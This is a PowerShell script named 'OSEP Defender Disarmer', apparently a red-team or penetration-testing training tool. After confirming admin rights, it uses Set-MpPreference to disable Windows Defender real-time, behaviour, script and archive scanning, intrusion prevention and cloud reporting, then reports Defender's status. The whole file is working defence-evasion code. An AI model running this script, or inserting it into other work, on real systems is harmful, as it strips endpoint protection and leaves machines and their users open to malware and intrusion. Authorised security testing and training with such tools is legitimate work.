<#
.SYNOPSIS
    OSEP Defender Disarmer (PowerShell)
    Part of the AVDisarm Arsenal.
    Requires High Integrity (Local Admin).
#>

Write-Host "[*] OSEP Defender Disarmer (PowerShell)" -ForegroundColor Cyan

# 1. Check Integrity
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "[-] ERROR: High Integrity (Admin) is required to disable protections." -ForegroundColor Red
    return
}

# 2. Disable Protections
Write-Host "[*] Disarming Defender components..." -ForegroundColor Gray
$prefArgs = @{
    DisableRealtimeMonitoring = $true
    DisableBehaviorMonitoring = $true
    DisableBlockAtFirstSeen = $true
    DisableIOAVProtection = $true
    DisablePrivacyMode = $true
    SignatureDisableUpdateOnStartupWithoutEngine = $true
    DisableArchiveScanning = $true
    DisableIntrusionPreventionSystem = $true
    DisableScriptScanning = $true
    SubmitSamplesConsent = 2
    MAPSReporting = 0
}

try {
    Set-MpPreference @prefArgs -ErrorAction Stop
    Write-Host "[+] Preferences updated successfully." -ForegroundColor Green
} catch {
    Write-Host "[-] FAILED to update preferences: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "[!] Note: This is often caused by 'Tamper Protection' being enabled." -ForegroundColor Yellow
}

# 3. Report Status
Write-Host "`n[*] Current Defender Status:" -ForegroundColor Cyan
$status = Get-MpComputerStatus
$results = [PSCustomObject]@{
    RealTime     = $status.RealTimeProtectionEnabled
    Behavior     = $status.BehaviorMonitorEnabled
    Cloud        = $status.IsCloudProtectionEnabled
    ScriptScan   = $status.IsScriptScanningEnabled
}
$results | Format-Table
